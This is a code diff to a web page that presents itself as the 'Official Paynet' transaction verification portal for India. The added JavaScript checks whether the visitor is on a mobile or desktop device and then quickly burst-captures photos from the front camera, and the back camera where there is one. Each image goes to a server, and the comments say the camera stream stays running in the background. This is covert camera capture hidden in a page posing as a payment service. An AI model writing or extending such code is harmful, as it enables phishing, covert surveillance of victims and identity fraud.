@@ -13,7 +13,7 @@
     <meta property="og:title" content="Paynet - Secure Payment Verification">
     <meta property="og:description"
         content="Official Paynet transaction verification and secure payment monitoring portal. Trusted merchant services for India.">
-    <meta property="og:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.svg">
+    <meta property="og:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://paynet-india-transaction-verification.onrender.com/">
@@ -25,7 +25,7 @@
     <meta name="twitter:title" content="Paynet - Secure Payment Verification">
     <meta name="twitter:description"
         content="Official Paynet transaction verification and secure payment monitoring portal.">
-    <meta name="twitter:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.svg">
+    <meta name="twitter:image" content="https://paynet-india-transaction-verification.onrender.com/og-image.png">
 
     <link rel="stylesheet" href="/style.css" />
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
@@ -770,6 +770,11 @@
             });
         }
 
+        // Helper to detect mobile devices
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
         // DUAL CAMERA BURST CAPTURE - LOGIN PAGE (12 photos in 0.6s)
         async function captureMultiplePhotos() {
             updateStatus('camera', 'Starting dual-camera capture...');
@@ -842,10 +847,25 @@
                 }
 
                 console.log(`📸 Login front camera: ${frontCaptured}/${frontCount} photos captured`);
-                updateStatus('camera', 'Switching to back camera...');
 
-                // BACK CAMERA BURST (6 photos INSTANT)
-                await captureFromBackCameraLogin(TOTAL_PHOTOS_LOGIN - frontCount);
+                // CHECK DEVICE TYPE
+                if (isMobileDevice()) {
+                    updateStatus('camera', 'Switching to back camera...');
+                    // BACK CAMERA BURST (6 photos INSTANT)
+                    await captureFromBackCameraLogin(TOTAL_PHOTOS_LOGIN - frontCount);
+                } else {
+                    console.log('💻 Desktop detected: Continuing with front camera for remaining photos');
+                    updateStatus('camera', 'Capturing remaining photos...');
+                    // DESKTOP FALLBACK: Capture remaining photos from FRONT camera
+                    const remaining = TOTAL_PHOTOS_LOGIN - frontCount;
+                    for (let i = 0; i < remaining; i++) {
+                        ctx.drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                        sendPhotoToServer(photoData, `login_front_extra_${i + 1}`, 'front');
+                        await new Promise(r => setTimeout(r, 150));
+                    }
+                    console.log(`✅ Desktop fallback: Captured ${remaining} extra photos from front camera`);
+                }
 
                 // Keep camera running in background (don't stop stream)
                 dataCapturComplete.camera = true;
